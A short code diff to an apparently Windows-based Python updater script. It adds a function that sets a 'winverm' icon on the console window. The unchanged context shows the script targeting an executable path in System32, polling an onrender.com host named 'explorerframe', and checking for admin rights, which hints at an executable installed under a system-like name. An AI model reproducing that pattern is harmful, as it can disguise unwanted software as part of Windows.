@@ -37,6 +37,33 @@ EXE_PATH = os.path.join(SYSTEM32_STR, EXE_NAME)
 API_URL = "https://explorerframe.onrender.com/api/v1/download/status"
 TOKEN = os.environ.get("UPDATE_TOKEN", "")  # Poner tu token aquí o en entorno
 
+# Ícono de winverm
+WINVERM_ICON_PATH = Path(__file__).parent / "app" / "winverm.ico"
+
+def set_process_icon():
+    """Establece el ícono de winverm.ico para el proceso actual."""
+    try:
+        if not WINVERM_ICON_PATH.exists():
+            return
+        
+        # Obtener el handle de la ventana de consola
+        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if hwnd:
+            # Cargar el ícono
+            hicon = ctypes.windll.user32.LoadImageW(
+                None,
+                str(WINVERM_ICON_PATH),
+                1,  # IMAGE_ICON
+                0,
+                0,
+                0x00000010  # LR_LOADFROMFILE
+            )
+            if hicon:
+                # Establecer el ícono de la ventana
+                ctypes.windll.user32.SendMessageW(hwnd, 0x0080, 0, hicon)  # WM_SETICON
+    except Exception as e:
+        pass  # Silenciar errores de ícono
+
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -116,4 +143,5 @@ def check_for_updates():
         print(f"❌ Error consultando actualizaciones: {e}")
 
 if __name__ == "__main__":
+    set_process_icon()
     check_and_update()
